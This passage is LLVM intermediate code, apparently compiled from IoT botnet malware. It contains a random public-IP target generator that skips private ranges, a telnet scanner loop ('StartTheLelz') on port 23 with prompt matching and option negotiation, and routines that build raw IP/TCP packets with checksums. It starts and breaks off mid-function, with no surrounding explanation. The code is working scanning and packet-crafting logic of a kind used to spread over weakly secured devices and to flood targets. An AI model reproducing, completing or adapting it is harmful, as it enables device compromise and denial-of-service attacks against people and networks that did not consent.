  %21 = sdiv i32 %0, 64
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 %22
  %24 = add nsw i32 %0, 1
  %25 = icmp eq i32 %2, 0
  br label %26

; <label>:26:                                     ; preds = %.lr.ph, %.backedge
  %.03335 = phi i32 [ %7, %.lr.ph ], [ %44, %.backedge ]
  %27 = load i64, i64* %12, align 8
  %28 = icmp sgt i64 %27, 0
  %29 = load i64, i64* %14, align 8
  %30 = icmp sgt i64 %29, 0
  %31 = or i1 %28, %30
  br i1 %31, label %32, label %.critedge.loopexit

; <label>:32:                                     ; preds = %26
  %33 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %17) #3, !srcloc !3
  %34 = load i64, i64* %23, align 8
  %35 = or i64 %34, %20
  store i64 %35, i64* %23, align 8
  %36 = call i32 @select(i32 %24, %struct.__sigset_t* nonnull %9, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %10) #3
  %37 = icmp slt i32 %36, 1
  br i1 %37, label %.critedge.loopexit, label %38

; <label>:38:                                     ; preds = %32
  %39 = sext i32 %.03335 to i64
  %40 = getelementptr inbounds i8, i8* %5, i64 %39
  %41 = call i64 @recv(i32 %0, i8* %40, i64 1, i32 0) #3
  %42 = trunc i64 %41 to i32
  switch i32 %42, label %43 [
    i32 -1, label %.critedge.loopexit
    i32 0, label %.critedge.loopexit
  ]

; <label>:43:                                     ; preds = %38
  %44 = add nsw i32 %42, %.03335
  %45 = load i8, i8* %40, align 1
  %46 = icmp eq i8 %45, -1
  br i1 %46, label %47, label %53

; <label>:47:                                     ; preds = %43
  %48 = getelementptr inbounds i8, i8* %40, i64 1
  %49 = call i64 @recv(i32 %0, i8* %48, i64 2, i32 0) #3
  %50 = trunc i64 %49 to i32
  switch i32 %50, label %51 [
    i32 -1, label %.critedge
    i32 0, label %.critedge
  ]

; <label>:51:                                     ; preds = %47
  %52 = call i32 @negotiate(i32 %0, i8* nonnull %40, i32 undef)
  br label %.critedge

; <label>:53:                                     ; preds = %43
  %54 = call i8* @strstr(i8* nonnull %5, i8* %1) #14
  %55 = icmp eq i8* %54, null
  br i1 %55, label %56, label %.critedge.loopexit

; <label>:56:                                     ; preds = %53
  br i1 %25, label %.backedge, label %59

.backedge:                                        ; preds = %56, %59
  %57 = add nsw i32 %44, 2
  %58 = icmp slt i32 %57, %6
  br i1 %58, label %26, label %.critedge.loopexit

; <label>:59:                                     ; preds = %56
  %60 = call i32 @matchPrompt(i8* nonnull %5)
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %.backedge, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.backedge, %26, %32, %59, %53, %38, %38
  %.0.ph = phi i32 [ 0, %38 ], [ 0, %38 ], [ 1, %53 ], [ 1, %59 ], [ 0, %32 ], [ 0, %26 ], [ 0, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %8, %47, %47, %51
  %.0 = phi i32 [ 0, %51 ], [ 0, %47 ], [ 0, %47 ], [ 0, %8 ], [ %.0.ph, %.critedge.loopexit ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() local_unnamed_addr #1 {
  %1 = alloca [16 x i8], align 16
  %2 = alloca [16 x i8], align 16
  %3 = load i8, i8* @ipState.1, align 1
  %4 = icmp eq i8 %3, 0
  br i1 %4, label %20, label %5

; <label>:5:                                      ; preds = %0
  %6 = load i8, i8* @ipState.4, align 1
  %7 = icmp eq i8 %6, -1
  br i1 %7, label %20, label %8

; <label>:8:                                      ; preds = %5
  %9 = add i8 %6, 1
  store i8 %9, i8* @ipState.4, align 1
  %10 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %10, i8 0, i64 16, i32 16, i1 false)
  %11 = load i8, i8* @ipState.1, align 1
  %12 = zext i8 %11 to i32
  %13 = load i8, i8* @ipState.2, align 1
  %14 = zext i8 %13 to i32
  %15 = load i8, i8* @ipState.3, align 1
  %16 = zext i8 %15 to i32
  %17 = load i8, i8* @ipState.4, align 1
  %18 = zext i8 %17 to i32
  %19 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %10, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.23, i64 0, i64 0), i32 %12, i32 %14, i32 %16, i32 %18)
  br label %88

; <label>:20:                                     ; preds = %5, %0
  %21 = tail call i32 @rand() #3
  %22 = srem i32 %21, 255
  %23 = trunc i32 %22 to i8
  store i8 %23, i8* @ipState.1, align 1
  %24 = tail call i32 @rand() #3
  %25 = srem i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* @ipState.2, align 1
  %27 = tail call i32 @rand() #3
  %28 = srem i32 %27, 255
  %29 = trunc i32 %28 to i8
  store i8 %29, i8* @ipState.3, align 1
  store i8 0, i8* @ipState.4, align 1
  br label %30

; <label>:30:                                     ; preds = %.critedge, %20
  %31 = load i8, i8* @ipState.1, align 1
  switch i8 %31, label %36 [
    i8 0, label %.critedge
    i8 10, label %.critedge
    i8 100, label %32
  ]

; <label>:32:                                     ; preds = %30
  %33 = load i8, i8* @ipState.2, align 1
  %34 = icmp ugt i8 %33, 63
  %35 = icmp sgt i8 %33, -1
  %or.cond = and i1 %34, %35
  br i1 %or.cond, label %.critedge, label %thread-pre-split

thread-pre-split:                                 ; preds = %32
  %.pr = load i8, i8* @ipState.1, align 1
  br label %36

; <label>:36:                                     ; preds = %thread-pre-split, %30
  %37 = phi i8 [ %.pr, %thread-pre-split ], [ %31, %30 ]
  switch i8 %37, label %41 [
    i8 127, label %.critedge
    i8 -87, label %38
  ]

; <label>:38:                                     ; preds = %36
  %39 = load i8, i8* @ipState.2, align 1
  %40 = icmp eq i8 %39, -2
  br i1 %40, label %.critedge, label %41

; <label>:41:                                     ; preds = %36, %38
  %42 = load i8, i8* @ipState.1, align 1
  %43 = icmp eq i8 %42, -84
  %44 = load i8, i8* @ipState.2, align 1
  %45 = icmp ult i8 %44, 17
  %or.cond14 = and i1 %43, %45
  br i1 %or.cond14, label %.critedge, label %46

; <label>:46:                                     ; preds = %41
  %47 = icmp eq i8 %42, -64
  %48 = icmp eq i8 %44, 0
  %or.cond16 = and i1 %47, %48
  %49 = load i8, i8* @ipState.3, align 1
  %50 = icmp eq i8 %49, 2
  %or.cond18 = and i1 %or.cond16, %50
  br i1 %or.cond18, label %.critedge, label %51

; <label>:51:                                     ; preds = %46
  %52 = icmp eq i8 %44, 88
  %or.cond20 = and i1 %47, %52
  %53 = icmp eq i8 %49, 99
  %or.cond22 = and i1 %or.cond20, %53
  %54 = icmp eq i8 %44, -88
  %or.cond24 = and i1 %47, %54
  %or.cond35 = or i1 %or.cond24, %or.cond22
  br i1 %or.cond35, label %.critedge, label %55

; <label>:55:                                     ; preds = %51
  %56 = icmp eq i8 %42, -58
  %57 = and i8 %44, -2
  %switch = icmp eq i8 %57, 18
  %or.cond36 = and i1 %56, %switch
  br i1 %or.cond36, label %.critedge, label %58

; <label>:58:                                     ; preds = %55
  %59 = load i8, i8* @ipState.1, align 1
  %60 = icmp eq i8 %59, -58
  %61 = load i8, i8* @ipState.2, align 1
  %62 = icmp eq i8 %61, 51
  %or.cond26 = and i1 %60, %62
  %63 = load i8, i8* @ipState.3, align 1
  %64 = icmp eq i8 %63, 100
  %or.cond28 = and i1 %or.cond26, %64
  br i1 %or.cond28, label %.critedge, label %65

; <label>:65:                                     ; preds = %58
  %66 = icmp eq i8 %59, -53
  %67 = icmp eq i8 %61, 0
  %or.cond30 = and i1 %66, %67
  %68 = icmp eq i8 %63, 113
  %or.cond32 = and i1 %or.cond30, %68
  %69 = icmp ugt i8 %59, -33
  %or.cond34 = or i1 %69, %or.cond32
  br i1 %or.cond34, label %.critedge, label %79

.critedge:                                        ; preds = %55, %65, %58, %51, %46, %41, %36, %32, %30, %30, %38
  %70 = tail call i32 @rand() #3
  %71 = srem i32 %70, 255
  %72 = trunc i32 %71 to i8
  store i8 %72, i8* @ipState.1, align 1
  %73 = tail call i32 @rand() #3
  %74 = srem i32 %73, 255
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* @ipState.2, align 1
  %76 = tail call i32 @rand() #3
  %77 = srem i32 %76, 255
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* @ipState.3, align 1
  br label %30

; <label>:79:                                     ; preds = %65
  %80 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %80, i8 0, i64 16, i32 16, i1 false)
  %81 = load i8, i8* @ipState.1, align 1
  %82 = zext i8 %81 to i32
  %83 = load i8, i8* @ipState.2, align 1
  %84 = zext i8 %83 to i32
  %85 = load i8, i8* @ipState.3, align 1
  %86 = zext i8 %85 to i32
  %87 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %80, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.24, i64 0, i64 0), i32 %82, i32 %84, i32 %86)
  br label %88

; <label>:88:                                     ; preds = %79, %8
  %.sink = phi i8* [ %80, %79 ], [ %10, %8 ]
  %89 = call i32 @inet_addr(i8* %.sink) #3
  ret i32 %89
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #17
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %xtraiter = and i32 %addconv, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph16.prol.loopexit, label %.lr.ph16.prol.preheader

.lr.ph16.prol.preheader:                          ; preds = %.lr.ph16.preheader
  br label %.lr.ph16.prol

.lr.ph16.prol:                                    ; preds = %.lr.ph16.prol, %.lr.ph16.prol.preheader
  %.014.prol = phi i64 [ %11, %.lr.ph16.prol ], [ 0, %.lr.ph16.prol.preheader ]
  %.0913.prol = phi i32 [ %12, %.lr.ph16.prol ], [ %1, %.lr.ph16.prol.preheader ]
  %.01012.prol = phi i16* [ %8, %.lr.ph16.prol ], [ %0, %.lr.ph16.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph16.prol ], [ %xtraiter, %.lr.ph16.prol.preheader ]
  %8 = getelementptr inbounds i16, i16* %.01012.prol, i64 1
  %9 = load i16, i16* %.01012.prol, align 2
  %10 = zext i16 %9 to i64
  %11 = add i64 %10, %.014.prol
  %12 = add nsw i32 %.0913.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph16.prol.loopexit.unr-lcssa, label %.lr.ph16.prol, !llvm.loop !4

.lr.ph16.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph16.prol
  br label %.lr.ph16.prol.loopexit

.lr.ph16.prol.loopexit:                           ; preds = %.lr.ph16.preheader, %.lr.ph16.prol.loopexit.unr-lcssa
  %.014.unr = phi i64 [ 0, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.0913.unr = phi i32 [ %1, %.lr.ph16.preheader ], [ %12, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.01012.unr = phi i16* [ %0, %.lr.ph16.preheader ], [ %8, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.lcssa26.unr = phi i64 [ undef, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %13 = icmp ult i32 %4, 6
  br i1 %13, label %._crit_edge17.loopexit, label %.lr.ph16.preheader.new

.lr.ph16.preheader.new:                           ; preds = %.lr.ph16.prol.loopexit
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16, %.lr.ph16.preheader.new
  %.014 = phi i64 [ %.014.unr, %.lr.ph16.preheader.new ], [ %29, %.lr.ph16 ]
  %.0913 = phi i32 [ %.0913.unr, %.lr.ph16.preheader.new ], [ %30, %.lr.ph16 ]
  %.01012 = phi i16* [ %.01012.unr, %.lr.ph16.preheader.new ], [ %26, %.lr.ph16 ]
  %14 = getelementptr inbounds i16, i16* %.01012, i64 1
  %15 = load i16, i16* %.01012, align 2
  %16 = zext i16 %15 to i64
  %17 = add i64 %16, %.014
  %18 = getelementptr inbounds i16, i16* %.01012, i64 2
  %19 = load i16, i16* %14, align 2
  %20 = zext i16 %19 to i64
  %21 = add i64 %20, %17
  %22 = getelementptr inbounds i16, i16* %.01012, i64 3
  %23 = load i16, i16* %18, align 2
  %24 = zext i16 %23 to i64
  %25 = add i64 %24, %21
  %26 = getelementptr inbounds i16, i16* %.01012, i64 4
  %27 = load i16, i16* %22, align 2
  %28 = zext i16 %27 to i64
  %29 = add i64 %28, %25
  %30 = add nsw i32 %.0913, -8
  %31 = icmp sgt i32 %30, 1
  br i1 %31, label %.lr.ph16, label %._crit_edge17.loopexit.unr-lcssa

._crit_edge17.loopexit.unr-lcssa:                 ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %.lr.ph16.prol.loopexit, %._crit_edge17.loopexit.unr-lcssa
  %.lcssa26 = phi i64 [ %.lcssa26.unr, %.lr.ph16.prol.loopexit ], [ %29, %._crit_edge17.loopexit.unr-lcssa ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %32 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %32, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa26, %._crit_edge17.loopexit ]
  %33 = icmp eq i32 %.09.lcssa, 1
  br i1 %33, label %34, label %.preheader

; <label>:34:                                     ; preds = %._crit_edge17
  %35 = bitcast i16* %.010.lcssa to i8*
  %36 = load i8, i8* %35, align 1
  %37 = zext i8 %36 to i64
  %38 = add i64 %37, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %34, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %38, %34 ]
  %39 = lshr i64 %.1.ph, 16
  %40 = icmp eq i64 %39, 0
  br i1 %40, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %41 = phi i64 [ %44, %.lr.ph ], [ %39, %.lr.ph.preheader ]
  %.111 = phi i64 [ %43, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %42 = and i64 %.111, 65535
  %43 = add nuw nsw i64 %42, %41
  %44 = lshr i64 %43, 16
  %45 = icmp eq i64 %44, 0
  br i1 %45, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %43, %._crit_edge.loopexit ]
  %46 = trunc i64 %.1.lcssa to i16
  %47 = xor i16 %46, -1
  ret i16 %47
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = load i32, i32* %3, align 4
  %5 = zext i32 %4 to i64
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %7 = load i32, i32* %6, align 4
  %8 = zext i32 %7 to i64
  %9 = tail call zeroext i16 @htons(i16 zeroext 20) #17
  %10 = tail call noalias i8* @malloc(i64 44) #3
  %11 = bitcast i8* %10 to i16*
  %.sroa.0.0..sroa_cast = bitcast i8* %10 to i64*
  store i64 %5, i64* %.sroa.0.0..sroa_cast, align 1
  %.sroa.2.0..sroa_idx6 = getelementptr inbounds i8, i8* %10, i64 8
  %.sroa.2.0..sroa_cast = bitcast i8* %.sroa.2.0..sroa_idx6 to i64*
  store i64 %8, i64* %.sroa.2.0..sroa_cast, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %10, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %10, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %10, i64 18
  %12 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %9, i16* %12, align 1
  %13 = getelementptr inbounds i8, i8* %10, i64 24
  %14 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %13, i8* %14, i64 20, i32 1, i1 false)
  %15 = tail call zeroext i16 @csum(i16* %11, i32 44)
  tail call void @free(i8* %10) #3
  ret i16 %15
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #1 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #3
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline noreturn nounwind uwtable
define void @StartTheLelz(i32) local_unnamed_addr #12 {
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca %struct.timeval, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.timeval, align 8
  %8 = tail call i32 @getdtablesize() #3
  %9 = sdiv i32 %8, 4
  %10 = mul nsw i32 %9, 3
  %11 = icmp slt i32 %10, 4096
  %12 = select i1 %11, i32 %10, i32 4096
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  store i16 2, i16* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 23) #17
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 3, i64 0
  %17 = bitcast i8* %16 to i64*
  store i64 0, i64* %17, align 4
  %18 = zext i32 %12 to i64
  %19 = alloca %struct.telstate_t, i64 %18, align 16
  %20 = bitcast %struct.telstate_t* %19 to i8*
  %21 = sext i32 %12 to i64
  %22 = mul nsw i64 %21, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %20, i8 0, i64 %22, i32 16, i1 false)
  %23 = icmp sgt i32 %8, 3
  br i1 %23, label %.lr.ph180.preheader, label %._crit_edge

.lr.ph180.preheader:                              ; preds = %1
  %24 = sext i32 %12 to i64
  br label %.lr.ph180

.lr.ph180:                                        ; preds = %.lr.ph180.preheader, %.lr.ph180
  %indvars.iv = phi i64 [ 0, %.lr.ph180.preheader ], [ %indvars.iv.next, %.lr.ph180 ]
  %25 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %indvars.iv, i32 3
  store i8 1, i8* %25, align 1
  %26 = tail call noalias i8* @malloc(i64 1024) #3
  %27 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %indvars.iv, i32 8
  store i8* %26, i8** %27, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %26, i8 0, i64 1024, i32 1, i1 false)
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %28 = icmp slt i64 %indvars.iv.next, %24
  br i1 %28, label %.lr.ph180, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph180
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 5, i64* %29, align 8
  %30 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %30, align 8
  %31 = icmp sgt i32 %8, 3
  %32 = bitcast %struct.timeval* %7 to i8*
  %33 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %2, i64 0, i32 0, i64 0
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %3, i64 0, i32 1
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit, %._crit_edge
  br i1 %31, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %36 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %37 = getelementptr inbounds %struct.timeval, %struct.timeval* %3, i64 0, i32 0
  %38 = bitcast i32* %5 to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %415
  %.1178 = phi i32 [ %.mux, %415 ], [ 0, %.lr.ph.preheader ]
  %39 = sext i32 %.1178 to i64
  %40 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39
  %41 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 2
  %42 = load i8, i8* %41, align 8
  switch i8 %42, label %415 [
    i8 0, label %43
    i8 1, label %95
    i8 2, label %144
    i8 3, label %174
    i8 4, label %197
    i8 5, label %236
    i8 6, label %259
    i8 7, label %304
    i8 8, label %314
    i8 9, label %324
    i8 10, label %334
    i8 11, label %344
  ]

; <label>:43:                                     ; preds = %.lr.ph
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 8
  %45 = load i8*, i8** %44, align 8
  call void @llvm.memset.p0i8.i64(i8* %45, i8 0, i64 1024, i32 1, i1 false)
  %46 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 3
  %47 = load i8, i8* %46, align 1
  %48 = icmp eq i8 %47, 0
  br i1 %48, label %55, label %49

; <label>:49:                                     ; preds = %43
  %50 = bitcast i8** %44 to i64*
  %51 = load i64, i64* %50, align 8
  %52 = bitcast %struct.telstate_t* %40 to i8*
  call void @llvm.memset.p0i8.i64(i8* %52, i8 0, i64 32, i32 16, i1 false)
  store i64 %51, i64* %50, align 8
  %53 = call i32 @getRandomPublicIP()
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 1
  store i32 %53, i32* %54, align 4
  br label %69

; <label>:55:                                     ; preds = %43
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 5
  %57 = load i8, i8* %56, align 1
  %58 = add i8 %57, 1
  store i8 %58, i8* %56, align 1
  %59 = icmp eq i8 %58, 14
  br i1 %59, label %60, label %64

; <label>:60:                                     ; preds = %55
  store i8 0, i8* %56, align 1
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 4
  %62 = load i8, i8* %61, align 2
  %63 = add i8 %62, 1
  store i8 %63, i8* %61, align 2
  br label %64

; <label>:64:                                     ; preds = %60, %55
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 4
  %66 = load i8, i8* %65, align 2
  %67 = icmp eq i8 %66, 6
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %64
  store i8 1, i8* %46, align 1
  br label %415

; <label>:69:                                     ; preds = %64, %49
  store i16 2, i16* %13, align 4
  store i16 %14, i16* %15, align 2
  store i64 0, i64* %17, align 4
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 1
  %71 = load i32, i32* %70, align 4
  store i32 %71, i32* %35, align 4
  %72 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  store i32 %72, i32* %73, align 16
  %74 = call i32 @setsockopt(i32 %72, i32 1, i32 20, i8* nonnull %32, i32 16) #3
  %75 = load i32, i32* %73, align 16
  %76 = call i32 @setsockopt(i32 %75, i32 1, i32 21, i8* nonnull %32, i32 16) #3
  %77 = load i32, i32* %73, align 16
  %78 = icmp eq i32 %77, -1
  br i1 %78, label %415, label %79

; <label>:79:                                     ; preds = %69
  %80 = call i32 (i32, i32, ...) @fcntl(i32 %77, i32 3, i8* null) #3
  %81 = or i32 %80, 2048
  %82 = call i32 (i32, i32, ...) @fcntl(i32 %77, i32 4, i32 %81) #3
  %83 = load i32, i32* %73, align 16
  %84 = call i32 @connect(i32 %83, %struct.sockaddr* nonnull %36, i32 16) #3
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %93

; <label>:86:                                     ; preds = %79
  %87 = tail call i32* @__errno_location() #17
  %88 = load i32, i32* %87, align 4
  %89 = icmp eq i32 %88, 115
  br i1 %89, label %93, label %90

; <label>:90:                                     ; preds = %86
  %91 = load i32, i32* %73, align 16
  %92 = call i32 @sclose(i32 %91)
  store i8 1, i8* %46, align 1
  br label %415

; <label>:93:                                     ; preds = %86, %79
  store i8 1, i8* %41, align 8
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 6
  store i32 0, i32* %94, align 4
  br label %415

; <label>:95:                                     ; preds = %.lr.ph
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 6
  %97 = load i32, i32* %96, align 4
  %98 = icmp eq i32 %97, 0
  br i1 %98, label %99, label %101

; <label>:99:                                     ; preds = %95
  %100 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %100, i32* %96, align 4
  br label %101

; <label>:101:                                    ; preds = %95, %99
  %102 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %33) #3, !srcloc !6
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %104 = load i32, i32* %103, align 16
  %105 = srem i32 %104, 64
  %106 = zext i32 %105 to i64
  %107 = shl i64 1, %106
  %108 = sdiv i32 %104, 64
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %2, i64 0, i32 0, i64 %109
  %111 = load i64, i64* %110, align 8
  %112 = or i64 %107, %111
  store i64 %112, i64* %110, align 8
  store i64 0, i64* %37, align 8
  store i64 10000, i64* %34, align 8
  %113 = load i32, i32* %103, align 16
  %114 = add nsw i32 %113, 1
  %115 = call i32 @select(i32 %114, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null, %struct.timeval* nonnull %3) #3
  switch i32 %115, label %135 [
    i32 1, label %116
    i32 -1, label %131
  ]

; <label>:116:                                    ; preds = %101
